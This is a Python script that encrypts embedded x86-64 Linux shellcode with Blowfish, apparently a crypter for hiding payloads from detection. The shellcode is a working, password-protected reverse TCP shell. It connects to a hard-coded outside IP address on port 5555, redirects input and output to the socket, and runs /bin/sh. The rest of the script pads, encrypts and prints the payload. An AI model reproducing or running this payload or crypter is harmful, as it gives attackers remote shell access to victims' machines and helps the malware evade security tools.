#!/usr/bin/env python3

import blowfish
import os
import sys

shellcode = b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xd2\xb0\x29\x40\xb7\x02\x40\xb6\x01\x0f\x05\x48\x89\xc7\x49\x89\xc2\x52\xc7\x44\x24\xfc\x64\x6f\x3d\x5d\x66\xc7\x44\x24\xfa\x15\xb3\x66\xc7\x44\x24\xf8\x02\x00\x48\x83\xec\x08\x48\x89\xe6\xb0\x2a\xb2\x10\x0f\x05\x48\x31\xf6\x40\xb6\x02\xb0\x21\x0f\x05\x48\xff\xce\x79\xf7\x48\xff\xc6\x40\x88\xf0\x48\x83\xec\x08\x48\x89\xe6\xb2\x08\x0f\x05\x48\xb8\x77\x61\x64\x75\x68\x65\x6b\x6b\x48\x89\xf7\x48\xaf\x75\x1d\x48\x31\xc0\x50\x49\xba\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x41\x52\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05\x44\x88\xd7\xb0\x03\x0f\x05\xb0\x3c\x48\x31\xff\x0f\x05"

byte_shellcode = bytearray(shellcode)

crypted = b""

key = input("Input the key to encrypt the shellcode ( length should be 4-56 characters ) : ")

if len(key) < 4 or len(key) > 56:
    print("Key length is not valid : Must be between 4-56 characters ...")
    sys.exit(-1)

cipher = blowfish.Cipher(key.encode())

i = 8 - (len(byte_shellcode) % 8)

while i > 0:
    i -= 1
    byte_shellcode.append(0x90)

l = ((len(byte_shellcode)) / 8) + 1
i = 1
p = 0

while i  < l:
    block = byte_shellcode[p:8*i]
    crypted += cipher.encrypt_block(block)
    i += 1
    p += 8


c = ""
unc = ""

for x in bytearray(crypted):
    c += "\\x%02x" % x

for x in bytearray(byte_shellcode):
    unc += "\\x%02x" % x

print("Before encryption : ")
print(unc)
print("\n")
print("After encryption : ")
print(c)
print("\n")
print("Key used to encrypt the shellcode : ")
print(key)











